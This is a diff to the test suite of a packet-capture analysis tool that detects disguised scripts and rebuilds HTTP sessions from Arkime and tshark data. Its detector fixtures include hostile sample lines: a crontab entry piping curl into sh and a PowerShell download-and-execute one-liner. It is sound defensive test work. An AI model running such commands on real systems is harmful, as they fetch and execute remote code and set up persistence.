@@ -75,6 +75,8 @@ RULE = "pcap.disguised_script_or_executable"
     (b"echo '* * * * * curl e|sh' | crontab -\n", "script", "heuristic"),           # piped into crontab
     (b"/etc/passwd user accounts\n/etc/shadow password hashes\n", "text", None),    # paths with descriptions
     (b"echo done > /root/install.log\n", "text", None),                            # not a persistence target
+    (b"echo hi | base64\n", "text", None),                                          # encoding is not running
+    (b"/tmp/a.1\n/tmp/sess_x\n", "text", None),                                      # a list of temp files
     ("\ufeffIEX (iwr http://e/a)\n".encode("utf-16"), "script", "heuristic"),     # UTF-16 PowerShell
     (b"# Project notes\n\nInstall the package, then run the tests.\n", "text", None),
     # hard benign: command lists that fetch, run, decode or persist nothing
@@ -387,12 +389,14 @@ class _Packets:
     def __init__(self, error=None, capped=False, max_bytes=32 * 1024 * 1024):
         self.error, self.capped, self.max_bytes, self.calls = error, capped, max_bytes, []
 
-    def fetch(self, ids, dest):
+    def fetch(self, ids, dest, max_bytes=None):
         self.calls.append(list(ids))
         if self.error:
             return pk.PacketFetch(None, ids, error=self.error)
-        dest.write_bytes(PCAP)
-        return pk.PacketFetch(dest, ids, len(PCAP), capped=self.capped)
+        limit = min(self.max_bytes, max_bytes or self.max_bytes)
+        body = PCAP[:limit]
+        dest.write_bytes(body)
+        return pk.PacketFetch(dest, ids, len(body), capped=self.capped or len(body) < len(PCAP))
 
 
 def _merge(merges=None):
@@ -592,7 +596,9 @@ def test_request_without_a_response_is_counted_not_partial(tmp_path, monkeypatch
                "tcp.srcport": ["50002"], "ip.dst": ["192.0.2.174"], "tcp.dstport": ["80"],
                "http.request.method": ["POST"], "http.response.code": []}
     rows = [_row(50000, T0.timestamp()), _row(50001, T0.timestamp()), request]
-    _repo, summary = _stage(tmp_path, monkeypatch, rows=rows)
+    sessions = [_session(f"241118-SESS{i:08d}", 50000 + i) for i in range(3)]
+    sessions[2]["_source"]["server"] = {"bytes": 0}                  # Arkime agrees: the server sent nothing
+    _repo, summary = _stage(tmp_path, monkeypatch, sessions=sessions, rows=rows)
     assert summary["sessions_request_only"] == 1 and summary["sessions_without_messages"] == 0
     assert summary["status"] == "complete" and any("no response" in n for n in summary["notes"])
 
@@ -689,10 +695,39 @@ def test_segments_are_fetched_one_by_one_in_order_and_merged(tmp_path, monkeypat
 def test_a_long_session_beyond_the_byte_budget_is_truncated_and_partial(tmp_path, monkeypatch):
     segs = [_session(f"241118-SEG{i:011d}", 50000, T0 - timedelta(minutes=30), T0 + timedelta(minutes=i))
             for i in range(5)]
-    packets = _Packets(max_bytes=len(PCAP) * 2)
+    packets = _Packets(max_bytes=len(PCAP) * 2 - 10)            # the second segment is cut at the budget
     repo, summary = _stage(tmp_path, monkeypatch, packets, sessions=segs, rows=[_row(50000, T0.timestamp())])
     assert len(packets.calls) == 2 and summary["truncated_batches"] == 1
     _partial(repo, summary, "one session's 5 segments) capture incomplete (download byte cap)")
+
+
+def test_a_session_that_exactly_fills_the_budget_is_complete(tmp_path, monkeypatch):
+    segs = [_session(f"241118-SEG{i:011d}", 50000, T0 - timedelta(minutes=30), T0 + timedelta(minutes=i))
+            for i in range(2)]
+    packets = _Packets(max_bytes=len(PCAP) * 2)
+    _repo, summary = _stage(tmp_path, monkeypatch, packets, sessions=segs, rows=[_row(50000, T0.timestamp())])
+    assert len(packets.calls) == 2 and summary["truncated_batches"] == 0
+
+
+def test_fetch_honours_a_smaller_per_call_budget(tmp_path):
+    out = _fetcher(tmp_path, lambda r: httpx.Response(200, content=PCAP + b"x" * 5000)).fetch(
+        ["241118-AAAAAAAAAAAA"], tmp_path / "a.pcap", max_bytes=100)
+    assert out.capped and out.path.stat().st_size == 100
+
+
+@pytest.mark.parametrize("fields", [{}, {"server": {}}, {"dstDataBytes": 0}, {"server": {"bytes": None}}])
+def test_unreadable_arkime_reply_fields_are_partial_not_request_only(tmp_path, monkeypatch, fields):
+    sess = _session("241118-SESS00000002", 50002)
+    sess["_source"].update(fields)
+    sessions = [_session("241118-SESS00000000", 50000), _session("241118-SESS00000001", 50001), sess]
+    request = {"frame.number": ["3"], "frame.time_epoch": [str(T0.timestamp())],
+               "frame.protocols": ["eth:ethertype:ip:tcp:http"], "ip.src": ["172.17.100.121"],
+               "tcp.srcport": ["50002"], "ip.dst": ["192.0.2.174"], "tcp.dstport": ["80"],
+               "http.request.method": ["GET"], "http.response.code": []}
+    rows = [_row(50000, T0.timestamp()), _row(50001, T0.timestamp()), request]
+    repo, summary = _stage(tmp_path, monkeypatch, sessions=sessions, rows=rows)
+    assert summary["sessions_request_only"] == 0 and summary["sessions_unrebuilt_response"] == 1
+    _partial(repo, summary, "could not rebuild")
 
 
 def test_a_response_arkime_saw_but_tshark_could_not_rebuild_is_partial(tmp_path, monkeypatch):
